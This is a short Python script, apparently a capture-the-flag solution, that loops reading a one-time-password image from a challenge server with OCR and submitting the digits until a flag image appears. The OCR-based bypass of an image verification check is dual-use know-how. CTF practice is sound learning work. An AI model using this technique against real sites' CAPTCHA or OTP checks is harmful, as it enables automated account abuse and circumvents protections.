from PIL import Image, ImageOps
import requests
from bs4 import BeautifulSoup
import pytesseract

url = "http://challenge.ctf.games:31170"

while(1):
    img_url = url+'/static/otp.png'
    img = Image.open(requests.get(img_url, stream = True).raw).crop((0, 0, 200, 75))
    img = ImageOps.invert(img)
    # img.show()

    number = pytesseract.image_to_string(img, config='-c tessedit_char_whitelist=0123456789').strip()
    
    data={}
    data['otp_entry'] = number

    try:
        img_url = url+'/static/flag.png'
        img = Image.open(requests.get(img_url, stream = True).raw)
        img.save("flag.png")
        break
    except:
        pass

    page = requests.post(url, data=data)
    soup = BeautifulSoup(page.content, "html.parser")
    count = int(soup.find_all('p', {'class':'count'})[0].get_text())
    print(number + " " + str(count))
